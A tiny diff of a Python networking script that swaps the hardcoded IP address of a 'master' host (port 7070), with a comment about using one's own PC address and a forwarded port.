@@ -2,7 +2,7 @@ import socket
 import struct
 import sys
 import time
-master = ("81.151.18.101",7070)     #add tuple of my pc address + a forwarded port
+master = ("86.137.149.100",7070)     #add tuple of my pc address + a forwarded port
 
 
 try:
